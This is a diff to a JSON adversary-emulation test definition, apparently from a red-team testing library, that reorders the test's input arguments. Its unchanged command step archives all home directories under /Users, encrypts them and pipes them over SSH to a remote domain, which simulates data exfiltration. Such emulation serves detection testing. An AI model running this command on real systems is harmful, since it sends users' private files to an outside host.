@@ -8,7 +8,7 @@
   ],
   "steps": [
     {
-      "id": "58c0bd31-3c08-469e-9057-3198e5342a1c",
+      "id": "5e3ae13b-cbda-4cee-bb93-11086f69eb16",
       "type": "execute-command",
       "data": {
         "command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat \u003e /Users.tar.gz.enc'\n",
@@ -23,6 +23,12 @@
   ],
   "input_arguments": [
     {
+      "name": "password",
+      "type": "string",
+      "description": "password for user",
+      "value": "atomic"
+    },
+    {
       "name": "domain",
       "type": "url",
       "description": "target SSH domain",
@@ -32,12 +38,6 @@
       "name": "user_name",
       "type": "string",
       "description": "username for domain",
-      "value": "atomic"
-    },
-    {
-      "name": "password",
-      "type": "string",
-      "description": "password for user",
       "value": "atomic"
     }
   ]
